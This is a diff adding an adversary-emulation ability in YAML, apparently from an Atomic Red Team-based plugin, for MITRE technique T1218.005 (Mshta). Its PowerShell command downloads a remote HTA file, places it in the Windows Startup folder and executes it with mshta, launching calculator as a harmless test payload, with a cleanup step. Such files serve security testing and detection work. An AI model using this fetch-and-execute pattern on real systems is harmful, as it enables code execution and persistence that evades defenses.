@@ -1,0 +1,24 @@
+---
+- id: 75763379b5e84bf879aa6d3eced37f2f
+  name: Mshta Executes Remote HTML Application (HTA)
+  description: 'Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1218.005
+    name: 'Signed Binary Proxy Execution: Mshta'
+  platforms:
+    windows:
+      psh:
+        command: $var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta";
+          $var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta";
+          mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta";
+          start-sleep -s 15; stop-process -name "calculator" -Force -ErrorAction Ignore;
+          stop-process -name "CalculatorApp" -Force -ErrorAction Ignore
+        payloads: []
+        cleanup: remove-item "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
+          -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
